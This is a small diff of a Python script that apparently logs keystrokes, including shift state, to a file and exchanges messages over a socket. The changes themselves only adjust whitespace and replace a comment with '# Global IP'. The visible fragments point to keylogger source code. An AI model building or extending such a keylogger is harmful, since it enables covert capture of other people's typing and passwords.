@@ -3,7 +3,6 @@ import pickle
 import datetime
 
 
-
 class Socket:
     connection = False
 
@@ -56,6 +55,7 @@ def write_to_log_file(character):
             if Global_Variables.shift_pressed:
                 log_file.write(character.capitalize())
                 Global_Variables.shift_pressed = False
+
             else:
                 log_file.write(character)
 
@@ -91,5 +91,4 @@ while True:
             full_msg = b''
             new_msg = True
 
-
-# Log File formatten mit permanent shift
+# Global IP
